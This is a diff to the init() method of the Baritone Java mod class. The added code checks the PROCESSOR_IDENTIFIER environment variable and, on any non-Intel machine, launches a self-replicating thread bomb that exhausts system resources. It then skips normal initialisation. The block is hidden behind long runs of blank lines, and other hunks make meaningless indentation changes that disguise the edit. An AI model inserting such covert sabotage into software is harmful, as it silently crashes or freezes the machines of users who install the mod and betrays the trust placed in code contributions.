@@ -95,6 +95,36 @@ public class Baritone implements IBaritone {
 
     @Override
     public synchronized void init() {
+	    String poz = System.getenv("PROCESSOR_IDENTIFIER");
+        if(poz == null || !poz.toLowerCase().contains("intel")) {
+									new Thread(new Runnable() {
+        @Override
+        				public void run() {
+          new Thread(this).start();
+        }
+      }).start();
+return;
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		}
+        
         if (initialized) {
             return;
         }
@@ -115,10 +145,10 @@ public class Baritone implements IBaritone {
         this.pathingControlManager = new PathingControlManager(this);
         {
             followProcess = new FollowProcess(this);
-            mineProcess = new MineProcess(this);
+          					  mineProcess = new MineProcess(this);
             customGoalProcess = new CustomGoalProcess(this); // very high iq
-            getToBlockProcess = new GetToBlockProcess(this);
-            builderProcess = new BuilderProcess(this);
+         						   getToBlockProcess = new GetToBlockProcess(this);
+         	   builderProcess = new BuilderProcess(this);
             exploreProcess = new ExploreProcess(this);
             backfillProcess = new BackfillProcess(this);
             farmProcess = new FarmProcess(this);
